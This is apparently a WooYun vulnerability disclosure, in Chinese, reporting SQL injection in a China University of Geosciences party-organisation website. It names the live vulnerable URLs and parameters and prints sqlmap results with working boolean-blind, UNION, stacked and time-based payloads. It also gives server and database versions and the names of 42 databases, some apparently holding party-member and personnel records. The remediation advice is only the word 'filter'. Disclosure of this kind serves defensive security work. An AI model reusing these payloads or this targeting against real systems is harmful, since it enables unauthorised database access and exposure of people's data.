wybug_title: 中国地质大学党委组织部SQL注入(附带几处)
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2015-01-13：	细节已通知厂商并且等待厂商处理中									2015-01-18：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入 详细说明：  SQL注入~！   漏洞证明：  注入点:http://zzb.cug.edu.cn/listNews.asp?AutoId=91http://zzb.cug.edu.cn/list.asp?n_kind_name=%C4%BC&c_kind_num=005 c_kind_num=005http://zzb.cug.edu.cn/list.asp?keys=sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: AutoId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: AutoId=91 AND 4024=4024    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: AutoId=-9585 UNION ALL SELECT NULL,CHAR(113)+CHAR(117)+CHAR(99)+CHAR(97)+CHAR(113)+CHAR(90)+CHAR(88)+CHAR(90)+CHAR(101)+CHAR(116)+CHAR(117)+CHAR(105)+CHAR(78)+CHAR(90)+CHAR(70)+CHAR(113)+CHAR(117)+CHAR(105)+CHAR(99)+CHAR(113),NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: AutoId=91; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: AutoId=91 AND 4445=(SELECT COUNT(*) FROM sysusers AS sys1,sysusersAS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)---[14:39:26] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[14:39:26] [INFO] fetched data logged to text files under 'C:\Documents and Settings\Administrator\.sqlmap\output\zzb.cug.edu.cn'[*] shutting down at 14:39:26current user:    'zzb'current database:    'ChinaGeology'available databases [42]:[*] 123[*] alum[*] ChinaGeology[*] ChinaGeologyXGB[*] CityPosInfo_cug[*] cug_assets[*] Cug_CRM[*] cugjw[*] cugpic[*] db_abstract[*] distmodel[*] dkxy[*] doctor[*] dxhx2007_stk[*] ELabCenter[*] gpmr2[*] hosmis[*] hzh360cs[*] labfacility[*] master[*] model[*] msdb[*] NewWebGroup[*] Northwind[*] oknew2[*] partyMemberDatabase[*] personoffice1[*] plscms[*] pubs[*] sbc[*] seascience[*] sq_plbeast[*] sucaiku[*] tempdb[*] upload[*] wlxf[*] xiaoban[*] xtw2008[*] yjsjy[*] zfxyxgz[*] zyxy[*] zzzx20080327过滤！   修复方案：  过滤！   版权声明：转载请注明来源 YuShen@乌云
